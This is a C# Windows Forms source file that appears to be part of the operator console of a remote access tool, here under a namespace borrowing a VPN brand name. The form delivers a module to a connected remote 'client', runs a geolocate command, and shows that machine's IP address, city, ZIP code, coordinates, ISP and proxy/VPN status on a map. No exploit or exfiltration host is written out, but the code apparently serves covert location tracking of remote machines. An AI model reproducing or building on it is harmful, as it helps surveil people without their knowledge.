using System.Text.Json;
using Microsoft.Web.WebView2.WinForms;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms;

public sealed class GeoLocationForm : Form
{
    private const string ModuleFile = "mullvad.Module.GeoLocation";
    private const string ModuleId   = "mullvad.geolocation";

    private readonly ClientHandler _handler;
    private ModuleContext?         _ctx;

    // ── Controls ─────────────────────────────────────────────────────────────
    private ToolStrip            toolbar      = null!;
    private ToolStripButton      btnRefresh   = null!;
    private WebView2             webView      = null!;
    private Panel                infoBar      = null!;
    private PictureBox           flagBox      = null!;
    private Label                lblInfo      = null!;
    private StatusStrip          statusStrip  = null!;
    private ToolStripStatusLabel statusLabel  = null!;
    private Panel                loadingPanel = null!;
    private Label                loadingLabel = null!;

    // ── Singleton per handler ─────────────────────────────────────────────────
    private static readonly Dictionary<ClientHandler, GeoLocationForm> _active = new();
    public static GeoLocationForm CreateOrActivate(ClientHandler h)
    {
        if (_active.TryGetValue(h, out var ex) && !ex.IsDisposed) { ex.BringToFront(); return ex; }
        var frm = new GeoLocationForm(h);
        _active[h] = frm;
        frm.FormClosed += (_, _) => _active.Remove(h);
        return frm;
    }

    private GeoLocationForm(ClientHandler handler)
    {
        _handler = handler;
        Build();
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Construction
    // ─────────────────────────────────────────────────────────────────────────
    private void Build()
    {
        SuspendLayout();

        Text          = $"Geo-Location  {_handler.Info.Computer}";
        ClientSize    = new Size(720, 520);
        MinimumSize   = new Size(560, 400);
        Font          = new Font("Segoe UI", 9F);
        StartPosition = FormStartPosition.CenterParent;
        ShowInTaskbar = true;

        var ico = IconLoader.Load("world_go.png");
        if (ico != null) Icon = Icon.FromHandle(((Bitmap)ico).GetHicon());

        // ── Toolbar ──────────────────────────────────────────────────────────
        toolbar    = new ToolStrip { GripStyle = ToolStripGripStyle.Hidden, Dock = DockStyle.Top };
        btnRefresh = MakeBtn("⟳", "Refresh", "refresh.png");
        btnRefresh.Click += (_, _) => _ = CollectAsync();
        toolbar.Items.Add(btnRefresh);

        // ── Status strip ─────────────────────────────────────────────────────
        statusStrip = new StatusStrip();
        statusLabel = new ToolStripStatusLabel { Spring = true, TextAlign = ContentAlignment.MiddleLeft };
        statusStrip.Items.Add(statusLabel);

        // ── Info bar (compact bottom strip, no header) ────────────────────────
        infoBar = new Panel
        {
            Dock    = DockStyle.Bottom,
            Height  = 48,
            Padding = new Padding(8, 0, 8, 0),
        };
        infoBar.Paint += (s, e) =>
        {
            // top border line
            using var pen = new Pen(SystemColors.ControlDark);
            e.Graphics.DrawLine(pen, 0, 0, infoBar.Width, 0);
        };

        flagBox = new PictureBox
        {
            Size     = new Size(40, 27),
            SizeMode = PictureBoxSizeMode.StretchImage,
            Top      = (48 - 27) / 2,
            Left     = 10,
        };

        lblInfo = new Label
        {
            AutoSize  = true,
            TextAlign = ContentAlignment.MiddleLeft,
            Font      = new Font("Segoe UI", 9F),
            Left      = 60,
            Top       = (48 - 16) / 2,
        };

        infoBar.Controls.AddRange(new Control[] { flagBox, lblInfo });

        // ── WebView2 map ──────────────────────────────────────────────────────
        webView = new WebView2 { Dock = DockStyle.Fill };

        // ── Loading overlay ───────────────────────────────────────────────────
        loadingPanel = new Panel { Dock = DockStyle.Fill, Visible = true };
        loadingLabel = new Label
        {
            Text      = "Delivering module to client…",
            Dock      = DockStyle.Fill,
            TextAlign = ContentAlignment.MiddleCenter,
            Font      = new Font("Segoe UI", 10F),
        };
        loadingPanel.Controls.Add(loadingLabel);

        // Docking order: Fill first, then Bottom, then Top
        Controls.Add(webView);
        Controls.Add(loadingPanel);
        Controls.Add(infoBar);
        Controls.Add(statusStrip);
        Controls.Add(toolbar);

        loadingPanel.BringToFront();

        ResumeLayout(false);
        PerformLayout();

        Load       += OnLoad;
        FormClosed += OnFormClosed;
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Load
    // ─────────────────────────────────────────────────────────────────────────
    private async void OnLoad(object? sender, EventArgs e)
    {
        try { await webView.EnsureCoreWebView2Async(null); }
        catch { }

        btnRefresh.Enabled = false;
        _handler.Disconnected += OnDisconnected;

        var progress = new Progress<string>(msg =>
        {
            loadingLabel.Text = msg;
            statusLabel.Text  = msg;
        });

        var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
        if (bytes == null)
        {
            loadingLabel.Text = "Module file not found. Build the GeoLocation project first.";
            statusLabel.Text  = "Module not found.";
            return;
        }

        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(45));
        bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler, ModuleFile, bytes, progress, cts.Token);
        if (!ok)
        {
            loadingLabel.Text = "Failed to deliver module.";
            statusLabel.Text  = "Module delivery failed.";
            return;
        }

        _ctx = new ModuleContext(_handler, ModuleId);
        _ctx.Disconnected += (_, _) => BeginInvoke(() => OnDisconnected(_handler));
        loadingPanel.Visible = false;
        btnRefresh.Enabled   = true;

        await CollectAsync();
    }

    private void OnFormClosed(object? sender, FormClosedEventArgs e)
    {
        _handler.Disconnected -= OnDisconnected;
        _ctx?.Dispose();
    }

    private void OnDisconnected(ClientHandler _)
    {
        if (IsDisposed) return;
        BeginInvoke(() =>
        {
            btnRefresh.Enabled   = false;
            statusLabel.Text     = "Disconnected.";
            loadingLabel.Text    = "Client disconnected.";
            loadingPanel.Visible = true;
        });
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Collect & display
    // ─────────────────────────────────────────────────────────────────────────
    private async Task CollectAsync()
    {
        if (_ctx == null) return;
        btnRefresh.Enabled = false;
        statusLabel.Text   = "Fetching geo-location…";
        try
        {
            var json = await _ctx.ExecuteAsync("geolocate", "");
            ParseAndDisplay(json);
        }
        catch (OperationCanceledException) { statusLabel.Text = "Timed out."; }
        catch (Exception ex)               { statusLabel.Text = $"Error: {ex.Message}"; }
        finally { btnRefresh.Enabled = true; }
    }

    private void ParseAndDisplay(string json)
    {
        try
        {
            using var doc = JsonDocument.Parse(json);
            var r = doc.RootElement;

            if (r.TryGetProperty("error", out var err))
            {
                statusLabel.Text = $"Module error: {err.GetString()}";
                return;
            }

            var lat     = r.TryGetProperty("lat", out var lp)  ? lp.GetDouble()  : 0.0;
            var lon     = r.TryGetProperty("lon", out var lnp) ? lnp.GetDouble() : 0.0;
            var cc      = Str(r, "countryCode");
            var city    = Str(r, "city");
            var country = Str(r, "country");
            var region  = Str(r, "regionName");
            var zip     = Str(r, "zip");
            var ip      = Str(r, "query");
            var tz      = Str(r, "timezone");
            var isp     = Str(r, "isp");

            // ── Map — navigate directly to OSM embed (no CDN, no access blocked)
            if (webView.CoreWebView2 != null)
            {
                double delta = 0.06;
                var url = $"https://www.openstreetmap.org/export/embed.html" +
                          $"?bbox={lon - delta:F6},{lat - delta:F6},{lon + delta:F6},{lat + delta:F6}" +
                          $"&layer=mapnik&marker={lat:F6},{lon:F6}";
                webView.CoreWebView2.Navigate(url);
            }

            // ── Flag ─────────────────────────────────────────────────────────
            if (!string.IsNullOrEmpty(cc))
                flagBox.Image = IconLoader.LoadFlag(cc);

            // ── Info bar text — single horizontal line, bullet-separated ──────
            var parts = new List<string>();
            if (!string.IsNullOrEmpty(country))
                parts.Add($"{country}{(string.IsNullOrEmpty(cc) ? "" : $" ({cc})")}");
            if (!string.IsNullOrEmpty(city))
            {
                var loc = city;
                if (!string.IsNullOrEmpty(region) && region != city) loc += $", {region}";
                if (!string.IsNullOrEmpty(zip))                       loc += $"  {zip}";
                parts.Add(loc);
            }
            if (!string.IsNullOrEmpty(ip))
                parts.Add(ip);
            if (lat != 0.0 || lon != 0.0)
                parts.Add($"{Math.Abs(lat):F4}°{(lat >= 0 ? "N" : "S")},  {Math.Abs(lon):F4}°{(lon >= 0 ? "E" : "W")}");
            if (!string.IsNullOrEmpty(tz))
                parts.Add($"{tz} (UTC{FormatOffset(r)})");
            if (!string.IsNullOrEmpty(isp))
                parts.Add(isp);

            lblInfo.Text = string.Join("   ·   ", parts);

            // ── Status tags ───────────────────────────────────────────────────
            var tags = new List<string>();
            if (r.TryGetProperty("proxy",   out var px) && px.GetBoolean()) tags.Add("PROXY");
            if (r.TryGetProperty("mobile",  out var mb) && mb.GetBoolean()) tags.Add("MOBILE");
            if (r.TryGetProperty("hosting", out var hs) && hs.GetBoolean()) tags.Add("HOSTING/VPN");

            statusLabel.Text = $"Resolved at {DateTime.Now:HH:mm:ss}"
                + (tags.Count > 0 ? "   ·   " + string.Join("  ", tags) : "");
        }
        catch (Exception ex)
        {
            statusLabel.Text = $"Parse error: {ex.Message}";
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Helpers
    // ─────────────────────────────────────────────────────────────────────────
    private static string FormatOffset(JsonElement r)
    {
        if (!r.TryGetProperty("offset", out var off)) return "";
        int secs = off.GetInt32();
        int h = Math.Abs(secs) / 3600;
        int m = (Math.Abs(secs) % 3600) / 60;
        return $"{(secs < 0 ? "-" : "+")}{h:00}:{m:00}";
    }

    private static ToolStripButton MakeBtn(string text, string tip, string? icon = null)
    {
        var btn = new ToolStripButton
        {
            ToolTipText  = tip,
            DisplayStyle = ToolStripItemDisplayStyle.Image,
            ImageScaling = ToolStripItemImageScaling.SizeToFit,
        };
        if (icon != null)
        {
            var img = IconLoader.Load(icon);
            if (img != null) { btn.Image = img; return btn; }
        }
        btn.Text         = text;
        btn.DisplayStyle = ToolStripItemDisplayStyle.Text;
        return btn;
    }

    private static string Str(JsonElement e, string key)
        => e.TryGetProperty(key, out var v) ? (v.GetString() ?? "") : "";
}
